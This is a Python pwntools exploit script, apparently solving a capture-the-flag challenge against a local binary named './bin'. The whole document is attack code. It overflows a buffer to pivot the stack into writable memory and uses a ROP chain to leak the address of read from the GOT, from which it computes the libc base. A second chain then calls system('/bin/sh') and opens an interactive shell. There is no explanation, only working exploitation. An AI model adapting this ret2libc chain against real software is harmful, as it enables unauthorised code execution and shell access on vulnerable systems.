from pwn import *
context.log_level = 'debug'

binary = ELF('./bin')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def write(addr, data):
    t.send('a'*32 + p64(addr+0x20) + p64(0x4006e5))
    t.send(data + p64(0x00601000+0xf00) + p64(0x4006e5))

def writeall(addr, data):
    l = len(data)/0x20
    for i in range(l):
        d = data[i*0x20:(i+1)*0x20]
        write(addr+i*0x20,d)

    d = data[(i+1)*0x20:]
    write(addr+(i+1)*0x20,d.ljust(0x20, '\x00'))

t = process('./bin')

t.recvuntil('try~\n')

rop = ''
rop += p64(0x0000000000400763)          #pop rdi ; ret
rop += p64(1)                           #stdout
rop += p64(0x0000000000400761)          #pop rsi ; pop r15 ; ret
rop += p64(binary.got['read'])          
rop += 'a'*8                            #padding
rop += p64(binary.plt['write'])
rop += p64(0x00000000004006bf)          #main

writeall(0x00601000+0x300, rop)

#gdb.attach(t)
t.send('a'*32 + p64(0x00601000+0x300-8) + p64(0x00000000004006fb))

read = u64(t.recv(8))
base = read - libc.symbols['read']
system = base + libc.symbols['system']
sh = base + libc.search('/bin/sh').next()

t.recvuntil('try~\n')
rop = ''
rop += p64(0x0000000000400763)          #pop rdi ; ret
rop += p64(sh)
rop += p64(system)
rop += 'b'*8

write(0x00601000+0x300, rop)
t.send('a'*32 + p64(0x00601000+0x300-8) + p64(0x00000000004006fb))

t.interactive()
